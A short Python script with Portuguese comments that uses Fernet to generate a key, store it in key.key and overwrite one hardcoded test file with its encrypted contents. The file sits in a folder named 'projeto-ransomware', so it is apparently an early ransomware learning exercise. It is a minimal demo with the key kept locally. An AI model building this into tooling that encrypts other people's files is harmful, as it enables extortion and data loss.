from cryptography.fernet import Fernet

# Gera uma chave e a salva em um arquivo

def generate_key():
	key = Fernet.generate_key()
	with open("key.key","wb") as key_file:
		key_file.write(key)

# carrega a chave de um arquivo

def load_key():
	return open("key.key", "rb").read()

# Criptografa o arquivo

def encrypt_file(file_path):
	key = load_key()
	fernet = Fernet(key)

	with open(file_path, "rb") as file:
		file_data = file.read()

	encrypted_data = fernet.encrypt(file_data)

	with open(file_path, "wb") as file:
		file.write(encrypted_data)

if __name__ == "__main__":
	generate_key()
	file_to_encrypt = "/home/userxxxx/projeto-ransomware/teste.txt"  # coloque o caminho do arquivo que será encryptado
	encrypt_file(file_to_encrypt)
	print(f"O arquivo {file_to_encrypt} foi criptografado.")
